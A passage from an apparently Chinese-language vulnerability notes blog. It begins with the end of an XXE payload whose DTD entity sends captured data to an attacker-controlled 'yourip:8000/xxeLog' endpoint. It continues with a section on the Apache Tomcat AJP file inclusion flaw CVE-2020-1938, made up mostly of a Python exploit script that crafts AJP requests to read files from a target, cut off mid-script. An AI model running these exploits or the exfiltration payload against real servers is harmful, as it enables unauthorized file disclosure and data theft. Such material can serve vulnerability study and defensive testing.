class="tag">&lt;/<span class="name">definitions</span>&gt;</span></span><br><span class="line"></span><br><span class="line">xx.dtd如下：</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ccc</span> <span class="meta-string">'&lt;!ENTITY ddd &amp;#39;&lt;import namespace="uri" location="http://yourip:8000/xxeLog?%aaa;"/&gt;&amp;#39;&gt;'</span>&gt;</span>%ccc;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://paper.seebug.org/1342/" target="_blank" rel="noopener">https://paper.seebug.org/1342/</a></p><h4 id="7、Apache-Tomcat文件包含漏洞-CVE-2020-1938"><a href="#7、Apache-Tomcat文件包含漏洞-CVE-2020-1938" class="headerlink" title="7、Apache Tomcat文件包含漏洞 CVE-2020-1938"></a>7、Apache Tomcat文件包含漏洞 CVE-2020-1938</h4><p>备注：2月漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#CNVD-2020-10487  Tomcat-Ajp lfi</span></span><br><span class="line"><span class="comment">#by ydhcui</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># Some references:</span></span><br><span class="line"><span class="comment"># https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_string</span><span class="params">(s)</span>:</span></span><br><span class="line"><span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">return</span> struct.pack(<span class="string">"&gt;h"</span>, <span class="number">-1</span>)</span><br><span class="line">l = len(s)</span><br><span class="line"><span class="keyword">return</span> struct.pack(<span class="string">"&gt;H%dsb"</span> % l, l, s.encode(<span class="string">'utf8'</span>), <span class="number">0</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpack</span><span class="params">(stream, fmt)</span>:</span></span><br><span class="line">size = struct.calcsize(fmt)</span><br><span class="line">buf = stream.read(size)</span><br><span class="line"><span class="keyword">return</span> struct.unpack(fmt, buf)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpack_string</span><span class="params">(stream)</span>:</span></span><br><span class="line">size, = unpack(stream, <span class="string">"&gt;h"</span>)</span><br><span class="line"><span class="keyword">if</span> size == <span class="number">-1</span>: <span class="comment"># null string</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">res, = unpack(stream, <span class="string">"%ds"</span> % size)</span><br><span class="line">stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFoundException</span><span class="params">(Exception)</span>:</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AjpBodyRequest</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="comment"># server == web server, container == servlet</span></span><br><span class="line">SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(<span class="number">2</span>)</span><br><span class="line">MAX_REQUEST_LENGTH = <span class="number">8186</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data_stream, data_len, data_direction=None)</span>:</span></span><br><span class="line">self.data_stream = data_stream</span><br><span class="line">self.data_len = data_len</span><br><span class="line">self.data_direction = data_direction</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serialize</span><span class="params">(self)</span>:</span></span><br><span class="line">data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)</span><br><span class="line"><span class="keyword">if</span> len(data) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> struct.pack(<span class="string">"&gt;bbH"</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x00</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">res = struct.pack(<span class="string">"&gt;H"</span>, len(data))</span><br><span class="line">res += data</span><br><span class="line"><span class="keyword">if</span> self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:</span><br><span class="line">header = struct.pack(<span class="string">"&gt;bbH"</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, len(res))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">header = struct.pack(<span class="string">"&gt;bbH"</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, len(res))</span><br><span class="line"><span class="keyword">return</span> header + res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_and_receive</span><span class="params">(self, socket, stream)</span>:</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">data = self.serialize()</span><br><span class="line">socket.send(data)</span><br><span class="line">r = AjpResponse.receive(stream)</span><br><span class="line"><span class="keyword">while</span> r.prefix_code != AjpResponse.GET_BODY_CHUNK <span class="keyword">and</span> r.prefix_code != AjpResponse.SEND_HEADERS:</span><br><span class="line">r = AjpResponse.receive(stream)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> r.prefix_code == AjpResponse.SEND_HEADERS <span class="keyword">or</span> len(data) == <span class="number">4</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AjpForwardRequest</span><span class="params">(object)</span>:</span></span><br><span class="line">_, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(<span class="number">28</span>)</span><br><span class="line">REQUEST_METHODS = &#123;<span class="string">'GET'</span>: GET, <span class="string">'POST'</span>: POST, <span class="string">'HEAD'</span>: HEAD, <span class="string">'OPTIONS'</span>: OPTIONS, <span class="string">'PUT'</span>: PUT, <span class="string">'DELETE'</span>: DELETE, <span class="string">'TRACE'</span>: TRACE&#125;</span><br><span class="line"><span class="comment"># server == web server, container == servlet</span></span><br><span class="line">SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(<span class="number">2</span>)</span><br><span class="line">COMMON_HEADERS = [<span class="string">"SC_REQ_ACCEPT"</span>,</span><br><span class="line"><span class="string">"SC_REQ_ACCEPT_CHARSET"</span>, <span class="string">"SC_REQ_ACCEPT_ENCODING"</span>, <span class="string">"SC_REQ_ACCEPT_LANGUAGE"</span>, <span class="string">"SC_REQ_AUTHORIZATION"</span>,</span><br><span class="line"><span class="string">"SC_REQ_CONNECTION"</span>, <span class="string">"SC_REQ_CONTENT_TYPE"</span>, <span class="string">"SC_REQ_CONTENT_LENGTH"</span>, <span class="string">"SC_REQ_COOKIE"</span>, <span class="string">"SC_REQ_COOKIE2"</span>,</span><br><span class="line"><span class="string">"SC_REQ_HOST"</span>, <span class="string">"SC_REQ_PRAGMA"</span>, <span class="string">"SC_REQ_REFERER"</span>, <span class="string">"SC_REQ_USER_AGENT"</span></span><br><span class="line">]</span><br><span class="line">ATTRIBUTES = [<span class="string">"context"</span>, <span class="string">"servlet_path"</span>, <span class="string">"remote_user"</span>, <span class="string">"auth_type"</span>, <span class="string">"query_string"</span>, <span class="string">"route"</span>, <span class="string">"ssl_cert"</span>, <span class="string">"ssl_cipher"</span>, <span class="string">"ssl_session"</span>, <span class="string">"req_attribute"</span>, <span class="string">"ssl_key_size"</span>, <span class="string">"secret"</span>, <span class="string">"stored_method"</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data_direction=None)</span>:</span></span><br><span class="line">self.prefix_code = <span class="number">0x02</span></span><br><span class="line">self.method = <span class="literal">None</span></span><br><span class="line">self.protocol = <span class="literal">None</span></span><br><span class="line">self.req_uri = <span class="literal">None</span></span><br><span class="line">self.remote_addr = <span class="literal">None</span></span><br><span class="line">self.remote_host = <span class="literal">None</span></span><br><span class="line">self.server_name = <span class="literal">None</span></span><br><span class="line">self.server_port = <span class="literal">None</span></span><br><span class="line">self.is_ssl = <span class="literal">None</span></span><br><span class="line">self.num_headers = <span class="literal">None</span></span><br><span class="line">self.request_headers = <span class="literal">None</span></span><br><span class="line">self.attributes = <span class="literal">None</span></span><br><span class="line">self.data_direction = data_direction</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_headers</span><span class="params">(self)</span>:</span></span><br><span class="line">self.num_headers = len(self.request_headers)</span><br><span class="line">res = <span class="string">""</span></span><br><span class="line">res = struct.pack(<span class="string">"&gt;h"</span>, self.num_headers)</span><br><span class="line"><span class="keyword">for</span> h_name <span class="keyword">in</span> self.request_headers:</span><br><span class="line"><span class="keyword">if</span> h_name.startswith(<span class="string">"SC_REQ"</span>):</span><br><span class="line">code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + <span class="number">1</span></span><br><span class="line">res += struct.pack(<span class="string">"BB"</span>, <span class="number">0xA0</span>, code)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">res += pack_string(h_name)</span><br><span class="line"></span><br><span class="line">res += pack_string(self.request_headers[h_name])</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_attributes</span><span class="params">(self)</span>:</span></span><br><span class="line">res = <span class="string">b""</span></span><br><span class="line"><span class="keyword">for</span> attr <span class="keyword">in</span> self.attributes:</span><br><span class="line">a_name = attr[<span class="string">'name'</span>]</span><br><span class="line">code = AjpForwardRequest.ATTRIBUTES.index(a_name) + <span class="number">1</span></span><br><span class="line">res += struct.pack(<span class="string">"b"</span>, code)</span><br><span class="line"><span class="keyword">if</span> a_name == <span class="string">"req_attribute"</span>:</span><br><span class="line">aa_name, a_value = attr[<span class="string">'value'</span>]</span><br><span class="line">res += pack_string(aa_name)</span><br><span class="line">res += pack_string(a_value)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">res += pack_string(attr[<span class="string">'value'</span>])</span><br><span class="line">res += struct.pack(<span class="string">"B"</span>, <span class="number">0xFF</span>)</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serialize</span><span class="params">(self)</span>:</span></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line">res = struct.pack(<span class="string">"bb"</span>, self.prefix_code, self.method)</span><br><span class="line">res += pack_string(self.protocol)</span><br><span class="line">res += pack_string(self.req_uri)</span><br><span class="line">res += pack_string(self.remote_addr)</span><br><span class="line">res += pack_string(self.remote_host)</span><br><span class="line">res += pack_string(self.server_name)</span><br><span class="line">res += struct.pack(<span class="string">"&gt;h"</span>, self.server_port)</span><br><span class="line">res += struct.pack(<span class="string">"?"</span>, self.is_ssl)</span><br><span class="line">res += self.pack_headers()</span><br><span class="line">res += self.pack_attributes()</span><br><span class="line"><span class="keyword">if</span> self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:</span><br><span class="line">header = struct.pack(<span class="string">"&gt;bbh"</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, len(res))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">header = struct.pack(<span class="string">"&gt;bbh"</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, len(res))</span><br><span class="line"><span class="keyword">return</span> header + res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, raw_packet)</span>:</span></span><br><span class="line">stream = StringIO(raw_packet)</span><br><span class="line">self.magic1, self.magic2, data_len = unpack(stream, <span class="string">"bbH"</span>)</span><br><span class="line">self.prefix_code, self.method = unpack(stream, <span class="string">"bb"</span>)</span><br><span class="line">self.protocol = unpack_string(stream)</span><br><span class="line">self.req_uri = unpack_string(stream)</span><br><span class="line">self.remote_addr = unpack_string(stream)</span><br><span class="line">self.remote_host = unpack_string(stream)</span><br><span class="line">self.server_name = unpack_string(stream)</span><br><span class="line">self.server_port = unpack(stream, <span class="string">"&gt;h"</span>)</span><br><span class="line">self.is_ssl = unpack(stream, <span class="string">"?"</span>)</span><br><span class="line">self.num_headers, = unpack(stream, <span class="string">"&gt;H"</span>)</span><br><span class="line">self.request_headers = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(self.num_headers):</span><br><span class="line">code, = unpack(stream, <span class="string">"&gt;H"</span>)</span><br><span class="line"><span class="keyword">if</span> code &gt; <span class="number">0xA000</span>:</span><br><span class="line">h_name = AjpForwardRequest.COMMON_HEADERS[code - <span class="number">0xA001</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">h_name = unpack(stream, <span class="string">"%ds"</span> % code)</span><br><span class="line">stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line">h_value = unpack_string(stream)</span><br><span class="line">self.request_headers[h_name] = h_value</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_and_receive</span><span class="params">(self, socket, stream, save_cookies=False)</span>:</span></span><br><span class="line">res = []</span><br><span class="line">i = socket.sendall(self.serialize())</span><br><span class="line"><span class="keyword">if</span> self.method == AjpForwardRequest.POST:</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">r = AjpResponse.receive(stream)</span><br><span class="line"><span class="keyword">assert</span> r.prefix_code == AjpResponse.SEND_HEADERS</span><br><span class="line">res.append(r)</span><br><span class="line"><span class="keyword">if</span> save_cookies <span class="keyword">and</span> <span class="string">'Set-Cookie'</span> <span class="keyword">in</span> r.response_headers:</span><br><span class="line">self.headers[<span class="string">'SC_REQ_COOKIE'</span>] = r.response_headers[<span class="string">'Set-Cookie'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># read body chunks and end response packets</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = AjpResponse.receive(stream)</span><br><span class="line">res.append(r)</span><br><span class="line"><span class="keyword">if</span> r.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">elif</span> r.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">raise</span> NotImplementedError</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AjpResponse</span><span class="params">(object)</span>:</span></span><br><span class="line">_,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(<span class="number">7</span>)</span><br><span class="line">COMMON_SEND_HEADERS = [</span><br><span class="line"><span class="string">"Content-Type"</span>, <span class="string">"Content-Language"</span>, <span class="string">"Content-Length"</span>, <span class="string">"Date"</span>, <span class="string">"Last-Modified"</span>,</span><br><span class="line"><span class="string">"Location"</span>, <span class="string">"Set-Cookie"</span>, <span class="string">"Set-Cookie2"</span>, <span class="string">"Servlet-Engine"</span>, <span class="string">"Status"</span>, <span class="string">"WWW-Authenticate"</span></span><br><span class="line">]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, stream)</span>:</span></span><br><span class="line"><span class="comment"># read headers</span></span><br><span class="line">self.magic, self.data_length, self.prefix_code = unpack(stream, <span class="string">"&gt;HHb"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> self.prefix_code == AjpResponse.SEND_HEADERS:</span><br><span class="line">self.parse_send_headers(stream)</span><br><span class="line"><span class="keyword">elif</span> self.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">self.parse_send_body_chunk(stream)</span><br><span class="line"><span class="keyword">elif</span> self.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">self.parse_end_response(stream)</span><br><span class="line"><span class="keyword">elif</span> self.prefix_code == AjpResponse.GET_BODY_CHUNK:</span><br><span class="line">self.parse_get_body_chunk(stream)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_send_headers</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">self.http_status_code, = unpack(stream, <span class="string">"&gt;H"</span>)</span><br><span class="line">self.http_status_msg = unpack_string(stream)</span><br><span class="line">self.num_headers, = unpack(stream, <span class="string">"&gt;H"</span>)</span><br><span class="line">self.response_headers = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(self.num_headers):</span><br><span class="line">code, = unpack(stream, <span class="string">"&gt;H"</span>)</span><br><span class="line"><span class="keyword">if</span> code &lt;= <span class="number">0xA000</span>: <span class="comment"># custom header</span></span><br><span class="line">h_name, = unpack(stream, <span class="string">"%ds"</span> % code)</span><br><span class="line">stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line">h_value = unpack_string(stream)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">h_name = AjpResponse.COMMON_SEND_HEADERS[code<span class="number">-0xA001</span>]</span><br><span class="line">h_value = unpack_string(stream)</span><br><span class="line">self.response_headers[h_name] = h_value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_send_body_chunk</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">self.data_length, = unpack(stream, <span class="string">"&gt;H"</span>)</span><br><span class="line">self.data = stream.read(self.data_length+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_end_response</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">self.reuse, = unpack(stream, <span class="string">"b"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_get_body_chunk</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">rlen, = unpack(stream, <span class="string">"&gt;H"</span>)</span><br><span class="line"><span class="keyword">return</span> rlen</span><br><span class="line"></span><br><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receive</span><span class="params">(stream)</span>:</span></span><br><span class="line">r = AjpResponse()</span><br><span class="line">r.parse(stream)</span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prepare_ajp_forward_request</span><span class="params">(target_host, req_uri, method=AjpForwardRequest.GET)</span>:</span></span><br><span class="line">fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)</span><br><span class="line">fr.method = method</span><br><span class="line">fr.protocol = <span class="string">"HTTP/1.1"</span></span><br><span class="line">fr.req_uri = req_uri</span><br><span class="line">fr.remote_addr = target_host</span><br><span class="line">fr.remote_host = <span class="literal">None</span></span><br><span class="line">fr.server_name = target_host</span><br><span class="line">fr.server_port = <span class="number">80</span></span><br><span class="line">fr.request_headers = &#123;</span><br><span class="line"><span class="string">'SC_REQ_ACCEPT'</span>: <span class="string">'text/html'</span>,</span><br><span class="line"><span class="string">'SC_REQ_CONNECTION'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line"><span class="string">'SC_REQ_CONTENT_LENGTH'</span>: <span class="string">'0'</span>,</span><br><span class="line"><span class="string">'SC_REQ_HOST'</span>: target_host,</span><br><span class="line"><span class="string">'SC_REQ_USER_AGENT'</span>: <span class="string">'Mozilla'</span>,</span><br><span class="line"><span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, sdch'</span>,</span><br><span class="line"><span class="string">'Accept-Language'</span>: <span class="string">'en-US,en;q=0.5'</span>,</span><br><span class="line"><span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line"><span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span></span><br><span class="line">&#125;</span><br><span class="line">fr.is_ssl = <span class="literal">False</span></span><br><span class="line">fr.attributes = []</span><br><span class="line"><span class="keyword">return</span> fr</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tomcat</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, target_host, target_port)</span>:</span></span><br><span class="line">self.target_host = target_host</span><br><span class="line">self.target_port = target_port</span><br><span class="line"></span><br><span class="line">self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">self.socket.connect((target_host, target_port))</span><br><span class="line">self.stream = self.socket.makefile(<span class="string">"rb"</span>, bufsize=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">perform_request</span><span class="params">(self, req_uri, headers=&#123;&#125;, method=<span class="string">'GET'</span>, user=None, password=None, attributes=[])</span>:</span></span><br><span class="line">self.req_uri = req_uri</span><br><span class="line">self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))</span><br><span class="line">print(<span class="string">"Getting resource at ajp13://%s:%d%s"</span> % (self.target_host, self.target_port, req_uri))</span><br><span class="line"><span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> password <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">self.forward_request.request_headers[<span class="string">'SC_REQ_AUTHORIZATION'</span>] = <span class="string">"Basic "</span> + (<span class="string">"%s:%s"</span> % (user, password)).encode(<span class="string">'base64'</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> headers:</span><br><span class="line">self.forward_request.request_headers[h] = headers[h]</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> attributes:</span><br><span class="line">self.forward_request.attributes.append(a)</span><br><span class="line">responses = self.forward_request.send_and_receive(self.socket, self.stream)</span><br><span class="line"><span class="keyword">if</span> len(responses) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">snd_hdrs_res = responses[<span class="number">0</span>]</span><br><span class="line">data_res = responses[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">if</span> len(data_res) == <span class="number">0</span>:</span><br><span class="line">print(<span class="string">"No data in response. Headers:%s\n"</span> % snd_hdrs_res.response_headers)</span><br><span class="line"><span class="keyword">return</span> snd_hdrs_res, data_res</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">javax.servlet.include.request_uri</span></span><br><span class="line"><span class="string">javax.servlet.include.path_info</span></span><br><span class="line"><span class="string">javax.servlet.include.servlet_path</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span 